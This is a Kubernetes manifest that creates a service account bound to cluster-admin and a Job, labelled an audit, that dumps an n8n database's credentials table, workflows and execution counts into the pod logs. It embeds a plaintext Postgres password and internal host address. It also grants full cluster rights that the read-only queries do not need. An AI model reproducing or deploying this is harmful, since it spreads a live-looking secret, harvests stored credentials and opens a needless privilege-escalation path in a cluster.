apiVersion: v1
kind: ServiceAccount
metadata:
  name: n8n-audit-sa
  namespace: default
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: n8n-audit-binding
subjects:
- kind: ServiceAccount
  name: n8n-audit-sa
  namespace: default
roleRef:
  kind: ClusterRole
  name: cluster-admin
  apiGroup: rbac.authorization.k8s.io
---
apiVersion: batch/v1
kind: Job
metadata:
  name: n8n-db-audit
  namespace: default
spec:
  ttlSecondsAfterFinished: 86400
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine:latest
        command:
        - /bin/sh
        - -c
        - |
          apk add -q postgresql-client 2>/dev/null
          echo "=== N8N CREDENTIALS TABLE ==="
          PGPASSWORD=d10AJfiOAI5uTdQd psql -h 172.16.10.14 -p 6432 -U n8nuser -d n8n -c "SELECT id, name, type, data FROM credentials ORDER BY id;" 2>&1
          echo "=== N8N WORKFLOWS ==="
          PGPASSWORD=d10AJfiOAI5uTdQd psql -h 172.16.10.14 -p 6432 -U n8nuser -d n8n -c "SELECT id, name, active FROM workflow_entity ORDER BY id;" 2>&1
          echo "=== N8N EXECUTION STATS ==="
          PGPASSWORD=d10AJfiOAI5uTdQd psql -h 172.16.10.14 -p 6432 -U n8nuser -d n8n -c "SELECT COUNT(*) as total_executions FROM execution_entity;" 2>&1
